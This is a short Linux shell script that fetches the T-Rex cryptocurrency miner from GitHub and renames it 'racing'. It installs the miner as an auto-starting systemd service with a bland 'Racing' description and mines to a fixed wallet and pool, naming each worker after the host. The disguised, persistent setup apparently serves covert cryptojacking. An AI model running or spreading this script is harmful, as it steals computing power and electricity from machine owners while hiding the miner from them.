cd /home
sudo wget https://github.com/trexminer/T-Rex/releases/download/0.25.12/t-rex-0.25.12-linux.tar.gz
sudo tar -zxvf t-rex-0.25.12-linux.tar.gz
sudo mv t-rex racing
myworker=$(date +'%d%m_%H%M%S_')
username=$HOSTNAME
shortname=${username:0:12}
myworker+=$shortname
sudo bash -c 'echo -e "[Unit]\nDescription=Racing\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/racing -a ethash -o us-eth.2miners.com:2020 -u 1P3CJd4X8Uj5oNo2ACBLx7DizzBhVvbqXx -p x -w ${myworker}_rehihi\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/racing.service'
sudo systemctl daemon-reload
sudo systemctl enable racing.service
sudo screen ./racing -a ethash -o us-eth.2miners.com:2020 -u 1P3CJd4X8Uj5oNo2ACBLx7DizzBhVvbqXx -p x -w $myworker
